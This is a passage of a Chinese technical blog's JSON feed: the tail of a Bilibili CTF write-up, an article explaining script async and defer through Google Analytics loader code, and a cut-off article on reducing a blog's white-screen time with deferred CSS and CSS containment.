<code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-25</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-13</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 